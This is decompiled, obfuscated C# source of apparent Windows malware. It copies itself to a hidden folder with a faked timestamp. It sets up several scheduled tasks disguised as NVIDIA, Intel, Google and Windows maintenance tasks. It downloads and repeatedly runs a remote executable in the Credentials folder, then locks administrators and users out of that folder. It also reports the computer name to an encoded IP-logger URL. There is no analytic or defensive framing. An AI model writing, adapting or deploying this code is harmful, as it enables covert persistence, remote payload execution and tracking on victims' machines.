using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Threading;
using System.Windows.Forms;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns11;
using ns20;

namespace ns16;

public class GClass16
{
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private static DateTime dateTime_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static object object_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static string string_0;

	public static DateTime T1
	{
		[CompilerGenerated]
		get
		{
			return dateTime_0;
		}
		[CompilerGenerated]
		set
		{
			dateTime_0 = value;
		}
	} = new DateTime(635452992000000000L);


	public static object ProccessName
	{
		[CompilerGenerated]
		get
		{
			return object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public static string TempDirPath
	{
		[CompilerGenerated]
		get
		{
			return string_0;
		}
		[CompilerGenerated]
		set
		{
			string_0 = value;
		}
	} = Path.GetTempPath();


	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			if (GClass20.bool_16)
			{
				if (!Operators.ConditionalCompareObjectNotEqual((object)Application.get_ExecutablePath(), GClass20.object_0, false))
				{
					return;
				}
				try
				{
					A();
					A(Conversions.ToString(GClass20.object_0));
					smethod_1();
					smethod_3();
					smethod_2();
					C.C();
					if (Conversions.ToBoolean(GClass20.string_6))
					{
						C.B();
					}
					if (GClass20.mutex_0 != null)
					{
						GClass20.mutex_0.Close();
						GClass20.mutex_0 = null;
					}
					GClass11.smethod_1();
					object[] array;
					bool[] array2;
					NewLateBinding.LateCall((object)null, typeof(Process), "Start", array = new object[1] { GClass20.object_0 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
					if (array2[0])
					{
						GClass20.object_0 = RuntimeHelpers.GetObjectValue(array[0]);
					}
					ProjectData.EndApp();
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return;
				}
			}
			GClass20.object_0 = Application.get_ExecutablePath();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private static void A()
	{
		try
		{
			if (!Directory.Exists(Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9))
			{
				Directory.CreateDirectory(Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9);
				Directory.SetCreationTime(Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9, T1);
			}
			else if (File.Exists(Conversions.ToString(GClass20.object_0)))
			{
				File.Delete(Conversions.ToString(GClass20.object_0));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void A(string string_1)
	{
		try
		{
			using (FileStream fileStream = new FileStream(Application.get_ExecutablePath(), FileMode.Open, FileAccess.Read))
			{
				byte[] array = new byte[(int)(fileStream.Length - 1L) + 1];
				int num = (int)fileStream.Length;
				int num2 = 0;
				while (num > 0)
				{
					int num3 = fileStream.Read(array, num2, num);
					if (num3 == 0)
					{
						break;
					}
					num2 += num3;
					num -= num3;
				}
				num = array.Length;
				using (FileStream fileStream2 = new FileStream(string_1, FileMode.Create, FileAccess.Write))
				{
					fileStream2.Write(array, 0, num);
					fileStream2.Flush();
					fileStream2.Close();
				}
				fileStream.Flush();
				fileStream.Close();
			}
			C.D(Conversions.ToString(GClass20.object_0));
			Thread.Sleep(5000);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		try
		{
			if (Operators.CompareString(C.C("ADX"), (string)null, false) == 0)
			{
				Random random = new Random();
				VBMath.Randomize();
				int num = 1;
				int num2;
				int num3;
				int num4;
				int num5;
				do
				{
					num2 = (int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)num) + 1f);
					num3 = (int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)num) + 1f);
					num4 = (int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)num) + 1f);
					num5 = (int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)num) + 1f);
					num++;
				}
				while (num <= 5);
				string text = "";
				int num6 = 1;
				do
				{
					text += Conversions.ToString(Strings.ChrW(64 + random.Next(1, 26)));
					num6++;
				}
				while (num6 <= 8);
				int num7 = random.Next(1, 1440);
				int num8 = random.Next(1, 1440);
				int num9 = random.Next(1, 1440);
				int num10 = random.Next(1, 1440);
				int num11 = random.Next(1, 1440);
				DateTime dateTime = DateTime.Today.AddMinutes(num7);
				DateTime dateTime2 = DateTime.Today.AddMinutes(num8);
				DateTime dateTime3 = DateTime.Today.AddMinutes(num9);
				DateTime dateTime4 = DateTime.Today.AddMinutes(num10);
				DateTime dateTime5 = DateTime.Today.AddMinutes(num11);
				_ = dateTime.Hour + ":" + dateTime.Minute;
				_ = dateTime2.Hour + ":" + dateTime2.Minute;
				_ = dateTime3.Hour + ":" + dateTime3.Minute;
				_ = dateTime4.Hour + ":" + dateTime4.Minute;
				_ = dateTime5.Hour + ":" + dateTime5.Minute;
				string text2 = dateTime.ToString("HH:mm");
				string text3 = dateTime2.ToString("HH:mm");
				string text4 = dateTime3.ToString("HH:mm");
				string text5 = dateTime4.ToString("HH:mm");
				string text6 = dateTime5.ToString("HH:mm");
				string[] array = new string[12]
				{
					Conversions.ToString(C.d("eR6mCEyAInWhqHvMBxB6mw==")),
					Conversions.ToString(C.d("FXPxpzW0w4fV39dgJu77Pg==")),
					Conversions.ToString(C.d("4+djJzwCADGVvkjlelENag==")),
					Conversions.ToString(C.d("Y9eW/tit4ki0hVX+Al3n5g==")),
					Conversions.ToString(C.d("vGOtvGQo+Cvd1sRA34BU2A==")),
					Conversions.ToString(C.d("rPLD1LAUXqhfN5ceoyjTfQ==")),
					Conversions.ToString(C.d("KHA2SQUcTlk76GudoIVpDQ==")),
					Conversions.ToString(C.d("nfJcvNaRzG03nP3o/LmWnQ==")),
					Conversions.ToString(C.d("wHxcEaoJMRCwdZR9640u+g==")),
					Conversions.ToString(C.d("TNaJXE5WpuEV3XNx9IjpAg==")),
					Conversions.ToString(C.d("mpgsOUsRjRqAZ6Yh96Y1cQ==")),
					Conversions.ToString(C.d("pnH6FwDALk0wgBSooVf4FQ=="))
				};
				object obj = array[(int)Math.Round(VBMath.Rnd() * (float)(array.Length - 1))];
				string[] array2 = new string[7]
				{
					Conversions.ToString(C.d("S5JTQa/JHatCH+kbEK5oqg==")),
					Conversions.ToString(C.d("xRBvGRffF8zxAu4GAiPdIA==")),
					Conversions.ToString(C.d("krl6ub4N041XoOSnz/244w==")),
					Conversions.ToString(C.d("9r5H4QYXoPbqVKgxQwwhJw==")),
					Conversions.ToString(C.d("WMotRtLDU0Rbjz7ngByclg==")),
					Conversions.ToString(C.d("K/zW145O/xl1bgJnGSE75g==")),
					Conversions.ToString(C.d("5pGxfC74DNbd59bpC/j9dQ=="))
				};
				object obj2 = array2[(int)Math.Round(VBMath.Rnd() * (float)(array2.Length - 1))];
				string text7 = text;
				string[] array3 = new string[38]
				{
					"NvBatteryBoostCheckOnLogon{" + text7,
					"NvTmRep_CrashReport{" + text7,
					"User_Feed_Synchronization{" + text7,
					"Intel PTT EK Recertification{" + text7,
					"NvNode Launcher{" + text7,
					"GoogleUpdateTaskMachineUA{" + text7,
					"GoogleUpdateTaskMachineCore{" + text7,
					"Intel TXE",
					"Intel Platform Trust Technology",
					" TPM 2.0 ",
					"Windows Update",
					"NUC",
					"Security Chip (TPM) Function",
					"ACCAgent",
					"ACCBackgroundApplication",
					"CreateExplorerShellUnelevatedTask",
					"StartComponentCleanup",
					".NET Framework NGEN v4.0.30319 Critical",
					"AD RMS Rights Policy Template Management (Automated)",
					"SmartScreenSpecific",
					"DsSvcCleanup",
					"BitLocker MDM policy Refresh",
					"BgTaskRegistrationMaintenanceTask",
					"Data Integrity Scan for Crash Recovery",
					"RecommendedTroubleshootingScanner",
					"Microsoft-Windows-DiskDiagnosticResolver",
					"StorageCardEncryption Task",
					"ExploitGuard MDM policy Refresh",
					"WakeUpAndScanForUpdates",
					"TempSignedLicenseExchange",
					"WinSAT",
					"MNO Metadata Parser",
					"NetworkStateChangeTask",
					"EnableLicenseAcquisition",
					"UPnPHostConfig",
					"PerformRemediation",
					"sihpostreboot",
					"XblGameSaveTask"
				};
				ProccessName = array3[(int)Math.Round(VBMath.Rnd() * (float)(array3.Length - 1))];
				string[] array4 = new string[66]
				{
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmhzsbEGQDbi6G6Tyo9bKu1A=")),
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmn/aeVSM8yrIZp5vFOIZzE8=")),
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmhv11NoMJcC7z1zMx0Vs9o8=")),
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmuRrUjKch/TBx1BzIHkqYCI=")),
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmn6FmaYWLuyWrfVGAlWW+f0=")),
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmtgkMRNK4b0xUNtczK4eM/I=")),
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmqDDWAO1zjxozW1sRhTlfP0=")),
					Conversions.ToString(C.F("6nFolhtgTHJbTVea3cNkl3TZGRzZFMvkh2lUj2k2ETU=")),
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmiq6uWZjDqHW/D+CjDgE0d0=")),
					Conversions.ToString(C.F("BVKdOR5nXHety8xyGJdxmpr/ZXfC08ueVFIIW2Iaz14=")),
					Conversions.ToString(C.F("DIep4qr/Hk/QaGzRge7EQ/WUOevAdR8BTdU6jGaNm+8=")),
					Conversions.ToString(C.F("4sf+1jrmKHFcrFnRna83/cOeHJFG046kKaTTk1LFYwA=")),
					Conversions.ToString(C.F("+ReshC6CaQe3KaZUh8z1Elx67zWoXECJFqoDxQxham8=")),
					Conversions.ToString(C.F("+ReshC6CaQe3KaZUh8z1Elx67zWoXECJFqoDxQxham8=")),
					Conversions.ToString(C.F("KM5kkb7DSmsbdCYlkVTBRV6z5A5fyUWTgK8monc7qTg=")),
					Conversions.ToString(C.F("nvVKovMU28A3oeIHKgok0vkYJ1EHDY8Gq5BRZeHQx3s=")),
					Conversions.ToString(C.F("IejGHD2x5EuXHbXbnrPCNoyZKSCsRRqklL+j95Vr8Z0=")),
					Conversions.ToString(C.F("RjnNrv9De8+ld47ZgqOvQN2dOxITViayPqiFwrv/ojc=")),
					Conversions.ToString(C.F("RjnNrv9De8+ld47ZgqOvQOfWlWC4SbG6iXV7KxMkNog=")),
					Conversions.ToString(C.F("eXB6DEvNXD0NgDSoii/VCbB63Hubz79OBgX68I0rhao=")),
					Conversions.ToString(C.F("KM5kkb7DSmsbdCYlkVTBRePCjyqLaSKZbVk7t0I2A4o=")),
					Conversions.ToString(C.F("O7Ogu32hUJaOGUJ9u/hqob9iCYsKq0BeOhG6QfBtbsI=")),
					Conversions.ToString(C.F("fYWeg2EgwYH7ZkIjc5WCahuHeiJF3I0cHgsbva/4ydc=")),
					Conversions.ToString(C.F("eqlRscI+PMDKYibg3qe26/RKGmcAobgJawJKH2mTeTA=")),
					Conversions.ToString(C.F("nvVKovMU28A3oeIHKgok0tFSNWI0H2B42fQTmDUg8JU=")),
					Conversions.ToString(C.F("4ULEwSC4eVHC5ONARc3Yw5WE8xepWFuTEsshWXRQjb4=")),
					Conversions.ToString(C.F("5dPFmhx2xGXEMZ9nT6yEhBnfQye6g8OAYUZE9LxVw+Y=")),
					Conversions.ToString(C.F("KM5kkb7DSmsbdCYlkVTBRSU8h8kerBUNkt+/tcV/HPk=")),
					Conversions.ToString(C.F("sJu2oTuThP6b+GhtxjnYUfM1Q2eQZptyP4S0KdOvEAE=")),
					Conversions.ToString(C.F("4ULEwSC4eVHC5ONARc3YwyN2LZska+DdPMkS4Z2sYkg=")),
					Conversions.ToString(C.F("5dPFmhx2xGXEMZ9nT6yEhA2pP2DNSJ5zVmOoT3jfrCU=")),
					Conversions.ToString(C.F("RjnNrv9De8+ld47ZgqOvQLjOobqFPi6BJ2kDxXW6BQM=")),
					Conversions.ToString(C.F("4ULEwSC4eVHC5ONARc3Yw5eHhrWniNVycubTw/XjgEo=")),
					Conversions.ToString(C.F("eqlRscI+PMDKYibg3qe264RBF6yW4+QI8bDBPxZN2qk=")),
					Conversions.ToString(C.F("eXB6DEvNXD0NgDSoii/VCfCxX8yfeSeDdlWIJvkOikY=")),
					Conversions.ToString(C.F("My7dA5z00FaxoGsdlnp/+GZewwPCjMhiTjhPk1Z+CH8=")),
					Conversions.ToString(C.F("ZTDqPhMb05WblhxoUbrxG6X7GoeIyWcl9QdpZhrZkCE=")),
					Conversions.ToString(C.F("5eY9AIsQWr9D0Gt/GOxZUzbIjgaVyn6ldigRFuyabBY=")),
					Conversions.ToString(C.F("v4L7RfP5ir4zOuN5UV9kUO2RL8F9rYGDYiXqysz2xdk=")),
					Conversions.ToString(C.F("EdJBPjXhvdbhyGDhC2FSukwotGq30XF3r/eV7wXl5EU=")),
					Conversions.ToString(C.F("gSVBpckNGDeWWdw4UmcfkDzjmmQWx2lMemDN1N17sdc=")),
					Conversions.ToString(C.F("3tg097gCOeZXx2Wj+y9pD4QZJU7pQgO6egR/Fkm8Bio=")),
					Conversions.ToString(C.F("ZTDqPhMb05WblhxoUbrxG//JePVfYxmMCo2DTIgn95o=")),
					Conversions.ToString(C.F("3tg097gCOeZXx2Wj+y9pD9RrjxEB13EYi1jRTDi42d0=")),
					Conversions.ToString(C.F("v4L7RfP5ir4zOuN5UV9kUHHqZx0eDiyUVLd5erX6w0k=")),
					Conversions.ToString(C.F("nvVKovMU28A3oeIHKgok0iWxvks8SwB8KD4FD2V8las=")),
					Conversions.ToString(C.F("3tg097gCOeZXx2Wj+y9pDy9bEh+2wq/w/uG5Ku/hHSo=")),
					Conversions.ToString(C.F("nvVKovMU28A3oeIHKgok0k/Eu/2YoPWKgLJVSqys3ms=")),
					Conversions.ToString(C.F("9nlCKJJTdgBcg4aaVkaeqr5ThDe090hx+HLF/oszj7U=")),
					Conversions.ToString(C.F("4sf+1jrmKHFcrFnRna83/ZzqY4jtLymDItgOlsmve3c=")),
					Conversions.ToString(C.F("IHd7C1lee+CS9WZM2sNAyXkk7/sf4+D0Prep/OGRrz4=")),
					Conversions.ToString(C.F("IHd7C1lee+CS9WZM2sNAyWUWI09r6xptOu5xKYakXA4=")),
					Conversions.ToString(C.F("IHd7C1lee+CS9WZM2sNAyRAshBEflkn7TPiPYUFJofE=")),
					Conversions.ToString(C.F("IHd7C1lee+CS9WZM2sNAybVrot6sEM3d6T54FBfphQo=")),
					Conversions.ToString(C.F("IHd7C1lee+CS9WZM2sNAyfzpgbD2eIt/BLEmUnUyLFo=")),
					Conversions.ToString(C.F("IHd7C1lee+CS9WZM2sNAyRoohQ7xV2KRJQ90RF6/W4c=")),
					Conversions.ToString(C.F("IHd7C1lee+CS9WZM2sNAyb/wJ6kJrtbMgtdZihtnv+8=")),
					Conversions.ToString(C.F("88tSRkvHDCxyfqT7SrqexKxZXs0ar2N0NrPOOJDZRg0=")),
					Conversions.ToString(C.F("88tSRkvHDCxyfqT7SrqexJW6GfXofvTpjb25+bCP4uE=")),
					Conversions.ToString(C.F("zhmmTGdOGhowv4y4R1sE249dcJtSyi7dC2TGkv0PFHg=")),
					Conversions.ToString(C.F("My7dA5z00FaxoGsdlnp/+GZewwPCjMhiTjhPk1Z+CH8=")),
					Conversions.ToString(C.F("5eY9AIsQWr9D0Gt/GOxZU+DGeCech17+jksN9YGjAG8=")),
					Conversions.ToString(C.F("My7dA5z00FaxoGsdlnp/+GwoCN6lA50PNJTsr6sd98M=")),
					Conversions.ToString(C.F("zhmmTGdOGhowv4y4R1sE2/aMUovWwuaIiX0MWw8Tows=")),
					Conversions.ToString(C.F("eqlRscI+PMDKYibg3qe267RVcSd290WOWLzeaeqiWxU=")),
					Conversions.ToString(C.F("brk6VSxws0Zksc/+sCLrKtw1r4VEyMjPpw83/db/5iA="))
				};
				object obj3 = array4[(int)Math.Round(VBMath.Rnd() * (float)(array4.Length - 1))];
				string text8 = "explorer";
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("schtasks /create /f /st \"" + text2 + "\" /sc daily /mo \"" + Conversions.ToString(num2) + "\"  /tn  \""), ProccessName), (object)"\" /tr \"'"), (object)text8), (object)"'"), obj3), (object)"\"")), (AppWinStyle)0, false, -1);
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("schtasks /create /f /st \"" + text3 + "\" /sc daily /mo \"" + Conversions.ToString(num3) + "\"  /tn  \""), ProccessName), (object)"\" /tr \"'"), (object)text8), (object)"'"), obj3), (object)"\"")), (AppWinStyle)0, false, -1);
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("schtasks /create /f /st \"" + text4 + "\" /sc daily /mo \"" + Conversions.ToString(num4) + "\"  /tn  \""), ProccessName), (object)"\" /tr \"'"), (object)text8), (object)"'"), obj3), (object)"\"")), (AppWinStyle)0, false, -1);
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("schtasks /create /f /st \"" + text5 + "\" /sc weekly /mo \"" + Conversions.ToString(num5) + "\"  /d \""), obj2), (object)"\"  /tn  \""), ProccessName), (object)"\" /tr \"'"), (object)text8), (object)"'"), obj3), (object)"\"")), (AppWinStyle)0, false, -1);
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("schtasks /create /f /st \"" + text6 + "\" /sc monthly /m \""), obj), (object)"\"  /tn  \""), ProccessName), (object)"\" /tr \"'"), (object)text8), (object)"'"), obj3), (object)"\"")), (AppWinStyle)0, false, -1);
				C.A("ADX", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_2()
	{
		try
		{
			if (Operators.CompareString(C.C("PLX"), (string)null, false) == 0)
			{
				Conversions.ToString(2);
				((ServerComputer)B.Computer).get_Info().get_OSFullName();
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string text = "\\Microsoft\\Credentials";
				string text2 = Conversions.ToString(C.g("+qXxnUEDlUoLgy8In6oNYg=="));
				string text3 = Conversions.ToString(C.g("GD7f1SdO1Xo6q2UlKrlDiQ=="));
				object objectValue = RuntimeHelpers.GetObjectValue(C.g("6Q5n+1Yw+61itnwT5qJDXw=="));
				string text4 = C.b(9) + ".exe";
				object obj = Operators.ConcatenateObject(C.g("gCcCyr+vV2Ogt4nInOtKCmPiwmo1z64UYwo43B3jeg2R0ifjzybvC+YptsndEDrG"), objectValue);
				((ServerComputer)B.Computer).get_Network().DownloadFile(new Uri(Conversions.ToString(obj)), folderPath + text + "\\" + text4, text2, text3);
				if (File.Exists(folderPath + text + "\\" + text4))
				{
					Thread.Sleep(1000);
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"schtasks /create /f /SC MINUTE /mo \"300\"  /tn  \"", ProccessName), (object)"\" /tr "), (object)folderPath), (object)text), (object)"\\"), (object)text4)), (AppWinStyle)0, true, -1);
					C.A(folderPath + text, "BUILTIN\\Администраторы", FileSystemRights.FullControl, AccessControlType.Deny);
					C.A(folderPath + text, "BUILTIN\\Пользователи", FileSystemRights.FullControl, AccessControlType.Deny);
					C.A(folderPath + text, "BUILTIN\\Administrators", FileSystemRights.FullControl, AccessControlType.Deny);
					C.A(folderPath + text, "BUILTIN\\Users", FileSystemRights.FullControl, AccessControlType.Deny);
					C.A("PLX", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_3()
	{
		try
		{
			if (Operators.CompareString(C.C("SLX"), (string)null, false) == 0)
			{
				string requestUriString = Conversions.ToString(C.h("aHR0cHM6Ly9pcGxvZ2dlci5vcmcvMmJkdGU1"));
				string text = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", null));
				WebRequest webRequest = WebRequest.Create(requestUriString);
				webRequest.Credentials = CredentialCache.DefaultCredentials;
				string text2 = text.Split(new char[1] { '-' }).First();
				((HttpWebRequest)webRequest).UserAgent = " Name:" + text2;
				webRequest.GetResponse();
				C.A("SLX", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
